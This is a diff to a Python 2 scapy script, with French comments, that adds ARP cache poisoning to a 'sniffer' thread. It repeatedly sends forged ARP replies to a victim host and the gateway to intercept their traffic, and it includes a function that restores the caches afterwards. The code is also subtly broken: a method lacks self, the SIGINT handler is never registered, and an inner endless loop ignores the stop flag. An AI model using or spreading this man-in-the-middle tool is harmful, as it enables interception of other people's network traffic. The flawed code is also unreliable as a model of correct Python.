@@ -15,20 +15,42 @@ class sniffer(threading.Thread):
 		self.IpVictim = IpVictim
 		self.MacVictim = MacVictim
 		self.IpGw = IpGw
-		self.MacGw = MacGw	
+		self.MacGw = MacGw
+
+	def originalMAC(ip):
+	    ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
+	    for s,r in ans:
+		return r[Ether].src
+
+	
 
 	def run(self):
 		print "IPVictim : "+self.IpVictim
 		print "MacVictim : "+self.MacVictim
 		print "IPGw : "+self.IpGw
 		print "MacGw : "+self.MacGw
-		while 1:
-			send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=routerMAC))
-	    	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=victimMAC))
-	    	time.sleep(1.5)
+		def poison(routerIP, victimIP, routerMAC, victimMAC):
+		    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=routerMAC))
+		    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=victimMAC))
+		def restore(routerIP, victimIP, routerMAC, victimMAC):
+		    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=1)
+		    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=1)
+		    sys.exit("losing...")
+		while not self.Terminated: 
+			if os.geteuid() != 0:
+				sys.exit("[!] Please run as root")
+			if self.MacGw == None:
+				sys.exit("Could not find router MAC address. Closing....")
+			if self.MacVictim == None:
+				sys.exit("Could not find victim MAC address. Closing....")
+			def signal_handler(signal, frame):
+				restore(self.IpGw, self.IpVictim, self.MacGw, self.MacVictim)
+				signal.signal(signal.SIGINT, signal_handler)
+			while 1:
+				poison(self.IpGw, self.IpVictim, self.MacGw, self.MacVictim)
+				time.sleep(1.5)
 		print "Le thread sniff s'est bien termine"
-    
-	#fonction permettant d'arreter la boucle du thread
+    	#fonction permettant d'arreter la boucle du thread
 	def stop(self): 
 		self.Terminated = True
 
